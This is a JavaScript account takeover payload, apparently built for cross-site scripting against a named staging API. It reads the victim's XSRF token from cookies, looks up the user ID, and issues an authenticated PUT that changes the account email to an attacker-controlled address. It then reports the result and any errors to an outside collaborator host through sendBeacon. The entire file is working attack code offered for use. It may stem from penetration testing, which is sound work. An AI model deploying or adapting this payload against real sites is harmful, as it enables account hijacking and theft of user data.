// a.js - Updated Account Takeover Payload (Based on Real API)

(function() {
    const API_BASE = 'https://basilstagingapi.coraltreetech.com';
    const ATTACKER_SERVER = 'https://n5ta34l9ze8omy6l2q4sb4v9a0gr4hs6.oastify.com/log';

    // 1. STEAL CSRF TOKEN (Check both formats)
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    // Try both possible cookie names (with and without double underscore)
    let xsrfToken = getCookie('__Secure-XSRF_TOKEN');
    if (!xsrfToken) xsrfToken = getCookie('Secure-XSRF_TOKEN');
    if (!xsrfToken) xsrfToken = getCookie('XSRF-TOKEN');

    if (!xsrfToken) {
        navigator.sendBeacon(ATTACKER_SERVER, 'ERROR: XSRF token not found');
        return;
    }

    // 2. FIRST: Get the current user's UUID
    fetch(API_BASE + '/api/v1/users/me', {
        method: 'GET',
        credentials: 'include',
        headers: {
            'X-Xsrf-Token': xsrfToken  // Exact casing from your screenshot
        }
    })
    .then(response => {
        if (!response.ok) throw new Error('Failed to fetch user profile');
        return response.json();
    })
    .then(userData => {
        // Find the user ID (adjust based on actual response structure)
        const userId = userData.id || userData.user?.id || userData.data?.id;
        
        if (!userId) {
            throw new Error('User ID not found in response: ' + JSON.stringify(userData));
        }

        // 3. SECOND: Update the user profile (change email and first name)
        return fetch(API_BASE + '/api/v1/users/' + userId, {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Xsrf-Token': xsrfToken  // Exact casing
            },
            body: JSON.stringify({
                user: {
                    first_name: 'Hacked',
                    email: 'harshit.j+regular1@cywarden.com'  // Change to your email
                    // You can also add: last_name, phone, etc.
                }
            })
        });
    })
    .then(response => {
        // 4. EXFILTRATE THE RESULT
        return response.text().then(text => {
            const data = {
                status: response.status,
                statusText: response.statusText,
                body: text
            };
            navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(data));
        });
    })
    .catch(error => {
        navigator.sendBeacon(ATTACKER_SERVER, 'ERROR: ' + error.message);
    });

})();
